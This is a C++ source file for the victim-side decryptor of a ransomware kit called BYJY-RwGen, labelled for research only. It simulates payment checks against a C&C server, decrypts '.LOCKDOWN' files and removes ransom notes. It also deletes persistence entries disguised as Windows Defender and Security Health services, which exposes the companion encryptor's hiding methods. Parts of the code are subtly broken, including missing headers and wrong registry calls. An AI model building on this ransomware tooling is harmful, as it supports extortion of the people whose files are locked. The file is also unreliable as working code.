/**
 * BYJY-RwGen Victim Decryptor
 * Decryption tool provided to victims after payment
 * FOR RESEARCH ANALYSIS ONLY
 */

#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <thread>
#include <mutex>
#include <sodium.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

namespace fs = std::filesystem;

class VictimDecryptor {
private:
    std::string master_key;
    std::string victim_id;
    std::mutex progress_mutex;
    int files_processed = 0;
    int total_files = 0;
    
public:
    VictimDecryptor(const std::string& key, const std::string& id) 
        : master_key(key), victim_id(id) {
        if (sodium_init() < 0) {
            throw std::runtime_error("Failed to initialize libsodium");
        }
    }
    
    void showWelcomeMessage() {
        std::wcout << L"╔══════════════════════════════════════════════════════════════════╗\n";
        std::wcout << L"║                    FILE RECOVERY TOOL                           ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  Your files have been successfully unlocked after payment       ║\n";
        std::wcout << L"║  verification. This tool will restore all your encrypted files. ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  FOR RESEARCH PURPOSES - ACADEMIC STUDY ONLY                    ║\n";
        std::wcout << L"╚══════════════════════════════════════════════════════════════════╝\n\n";
        
        std::wcout << L"Victim ID: " << victim_id.c_str() << L"\n";
        std::wcout << L"Recovery initiated at: " << getCurrentTimeString() << L"\n\n";
    }
    
    bool verifyPayment() {
        std::wcout << L"[1/4] Verifying payment status...\n";
        
        // Simulate payment verification
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        // In real implementation, this would contact C&C server
        // to verify payment has been received
        std::wcout << L"✓ Payment verified successfully\n";
        std::wcout << L"✓ Decryption key authorized\n\n";
        
        return true;
    }
    
    std::vector<fs::path> findEncryptedFiles() {
        std::wcout << L"[2/4] Scanning for encrypted files...\n";
        
        std::vector<fs::path> encrypted_files;
        std::vector<std::string> search_paths = {
            "C:\\Users",
            "D:\\",
            "E:\\",
            "F:\\"
        };
        
        for (const auto& path : search_paths) {
            if (!fs::exists(path)) continue;
            
            try {
                for (const auto& entry : fs::recursive_directory_iterator(path)) {
                    if (entry.is_regular_file()) {
                        auto filepath = entry.path();
                        if (filepath.extension() == ".LOCKDOWN") {
                            encrypted_files.push_back(filepath);
                        }
                    }
                }
            } catch (const std::exception& e) {
                // Skip inaccessible directories
                continue;
            }
        }
        
        total_files = encrypted_files.size();
        std::wcout << L"✓ Found " << total_files << L" encrypted files\n\n";
        
        return encrypted_files;
    }
    
    bool decryptAllFiles(const std::vector<fs::path>& files) {
        std::wcout << L"[3/4] Decrypting files...\n";
        
        if (files.empty()) {
            std::wcout << L"No encrypted files found to decrypt.\n";
            return true;
        }
        
        // Create progress display thread
        std::thread progress_thread(&VictimDecryptor::showProgress, this);
        
        // Multi-threaded decryption
        std::vector<std::thread> workers;
        const int num_threads = std::min(8, (int)std::thread::hardware_concurrency());
        const int files_per_thread = files.size() / num_threads + 1;
        
        for (int i = 0; i < num_threads; ++i) {
            int start_idx = i * files_per_thread;
            int end_idx = std::min((int)files.size(), start_idx + files_per_thread);
            
            if (start_idx < end_idx) {
                auto file_range = std::vector<fs::path>(files.begin() + start_idx, files.begin() + end_idx);
                workers.emplace_back(&VictimDecryptor::decryptFileRange, this, file_range);
            }
        }
        
        // Wait for all threads to complete
        for (auto& worker : workers) {
            worker.join();
        }
        
        // Stop progress thread
        progress_thread.detach();
        
        std::wcout << L"\n✓ File decryption completed successfully\n\n";
        return true;
    }
    
    void performSystemCleanup() {
        std::wcout << L"[4/4] Performing system cleanup...\n";
        
        // Remove ransom notes
        std::vector<std::string> ransom_note_names = {
            "HOW_TO_DECRYPT_FILES.txt",
            "RECOVERY_INSTRUCTIONS.txt",
            "READ_ME_FOR_DECRYPT.txt"
        };
        
        for (const auto& drive : {"C:\\", "D:\\", "E:\\", "F:\\"}) {
            for (const auto& note_name : ransom_note_names) {
                fs::path ransom_path = fs::path(drive) / note_name;
                if (fs::exists(ransom_path)) {
                    fs::remove(ransom_path);
                }
            }
        }
        
        // Remove registry persistence entries
        cleanupRegistryEntries();
        
        // Remove scheduled tasks
        cleanupScheduledTasks();
        
        // Remove startup entries
        cleanupStartupEntries();
        
        std::wcout << L"✓ System cleanup completed\n";
        std::wcout << L"✓ All persistence mechanisms removed\n\n";
    }
    
    void displayCompletionMessage() {
        std::wcout << L"╔══════════════════════════════════════════════════════════════════╗\n";
        std::wcout << L"║                     RECOVERY COMPLETED                           ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  ✓ All files have been successfully decrypted                   ║\n";
        std::wcout << L"║  ✓ System has been cleaned of all malicious components         ║\n";
        std::wcout << L"║  ✓ Your computer is now safe to use normally                   ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  Files decrypted: " << std::setw(6) << total_files << L"                                   ║\n";
        std::wcout << L"║  Recovery time: " << getCurrentTimeString() << L"                        ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  RECOMMENDATIONS:                                               ║\n";
        std::wcout << L"║  • Update your antivirus and run a full system scan            ║\n";
        std::wcout << L"║  • Install latest Windows updates                              ║\n";
        std::wcout << L"║  • Backup your important files regularly                       ║\n";
        std::wcout << L"║  • Be cautious with email attachments and downloads           ║\n";
        std::wcout << L"║                                                                  ║\n";
        std::wcout << L"║  Thank you for your cooperation in this research study.        ║\n";
        std::wcout << L"╚══════════════════════════════════════════════════════════════════╝\n\n";
        
        std::wcout << L"Press any key to exit...\n";
        _getch();
    }
    
private:
    void decryptFileRange(const std::vector<fs::path>& files) {
        for (const auto& encrypted_file : files) {
            try {
                decryptSingleFile(encrypted_file);
                
                // Update progress
                {
                    std::lock_guard<std::mutex> lock(progress_mutex);
                    files_processed++;
                }
                
            } catch (const std::exception& e) {
                // Log error but continue with other files
                continue;
            }
        }
    }
    
    void decryptSingleFile(const fs::path& encrypted_file) {
        // Read encrypted file
        std::ifstream file(encrypted_file, std::ios::binary);
        if (!file) return;
        
        std::vector<unsigned char> encrypted_data(
            (std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>()
        );
        file.close();
        
        // Decrypt file content
        auto decrypted_data = performDecryption(encrypted_data);
        
        // Determine original filename (remove .LOCKDOWN extension)
        fs::path original_file = encrypted_file;
        original_file.replace_extension("");
        
        // Write decrypted file
        std::ofstream output_file(original_file, std::ios::binary);
        if (output_file) {
            output_file.write(
                reinterpret_cast<const char*>(decrypted_data.data()),
                decrypted_data.size()
            );
            output_file.close();
            
            // Remove encrypted version
            fs::remove(encrypted_file);
        }
    }
    
    std::vector<unsigned char> performDecryption(const std::vector<unsigned char>& ciphertext) {
        if (ciphertext.size() < crypto_aead_xchacha20poly1305_ietf_NPUBBYTES + crypto_aead_xchacha20poly1305_ietf_ABYTES) {
            throw std::runtime_error("Ciphertext too short");
        }
        
        // Extract nonce (last 24 bytes)
        size_t nonce_size = crypto_aead_xchacha20poly1305_ietf_NPUBBYTES;
        size_t ciphertext_len = ciphertext.size() - nonce_size;
        const unsigned char* nonce = ciphertext.data() + ciphertext_len;
        
        // Decrypt using XChaCha20-Poly1305
        std::vector<unsigned char> plaintext(ciphertext_len);
        unsigned long long plaintext_len;
        
        if (crypto_aead_xchacha20poly1305_ietf_decrypt(
            plaintext.data(), &plaintext_len,
            nullptr,
            ciphertext.data(), ciphertext_len,
            nullptr, 0,
            nonce,
            reinterpret_cast<const unsigned char*>(master_key.data())
        ) != 0) {
            throw std::runtime_error("Decryption failed - invalid key or corrupted file");
        }
        
        plaintext.resize(plaintext_len);
        return plaintext;
    }
    
    void showProgress() {
        while (files_processed < total_files) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            
            {
                std::lock_guard<std::mutex> lock(progress_mutex);
                if (total_files > 0) {
                    int percentage = (files_processed * 100) / total_files;
                    std::wcout << L"\rProgress: [";
                    
                    int bar_width = 30;
                    int filled = (percentage * bar_width) / 100;
                    
                    for (int i = 0; i < bar_width; ++i) {
                        if (i < filled) std::wcout << L"█";
                        else std::wcout << L"░";
                    }
                    
                    std::wcout << L"] " << percentage << L"% (" 
                              << files_processed << L"/" << total_files << L")";
                }
            }
        }
    }
    
    void cleanupRegistryEntries() {
        // Remove persistence registry entries
        std::vector<std::wstring> registry_keys = {
            L"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{F5BFEEF7-48F2-4A8C-8E2D-1F1DAB9E4C2D}",
            L"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealthTray",
            L"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurityHealthService"
        };
        
        for (const auto& key : registry_keys) {
            RegDeleteTreeW(HKEY_CURRENT_USER, key.c_str());
        }
    }
    
    void cleanupScheduledTasks() {
        // Remove malicious scheduled tasks
        std::vector<std::string> task_names = {
            "WindowsDefenderService",
            "MicrosoftEdgeUpdateTaskMachineUA",
            "SystemSecurityUpdate"
        };
        
        for (const auto& task : task_names) {
            std::string cmd = "schtasks /delete /tn \"" + task + "\" /f >nul 2>&1";
            system(cmd.c_str());
        }
    }
    
    void cleanupStartupEntries() {
        // Remove startup shortcuts
        wchar_t startup_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, startup_path))) {
            fs::path startup_dir(startup_path);
            
            std::vector<std::string> malicious_shortcuts = {
                "WindowsDefender.lnk",
                "SecurityHealthTray.lnk",
                "SystemUpdate.lnk"
            };
            
            for (const auto& shortcut : malicious_shortcuts) {
                fs::path shortcut_path = startup_dir / shortcut;
                if (fs::exists(shortcut_path)) {
                    fs::remove(shortcut_path);
                }
            }
        }
    }
    
    std::wstring getCurrentTimeString() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        wchar_t time_str[100];
        struct tm timeinfo;
        localtime_s(&timeinfo, &time_t);
        wcsftime(time_str, sizeof(time_str), L"%Y-%m-%d %H:%M:%S", &timeinfo);
        
        return std::wstring(time_str);
    }
};

int main(int argc, char* argv[]) {
    try {
        // Set console to support Unicode
        SetConsoleOutputCP(CP_UTF8);
        std::wcout.imbue(std::locale(""));
        
        if (argc != 3) {
            std::wcout << L"Usage: decryptor.exe <decryption_key> <victim_id>\n";
            return 1;
        }
        
        std::string decryption_key = argv[1];
        std::string victim_id = argv[2];
        
        VictimDecryptor decryptor(decryption_key, victim_id);
        
        // Recovery process
        decryptor.showWelcomeMessage();
        
        if (!decryptor.verifyPayment()) {
            std::wcout << L"Payment verification failed. Please contact support.\n";
            return 1;
        }
        
        auto encrypted_files = decryptor.findEncryptedFiles();
        
        if (!decryptor.decryptAllFiles(encrypted_files)) {
            std::wcout << L"Decryption process failed. Please contact support.\n";
            return 1;
        }
        
        decryptor.performSystemCleanup();
        decryptor.displayCompletionMessage();
        
        return 0;
        
    } catch (const std::exception& e) {
        std::wcout << L"Error: " << e.what() << L"\n";
        std::wcout << L"Please contact support for assistance.\n";
        return 1;
    }
}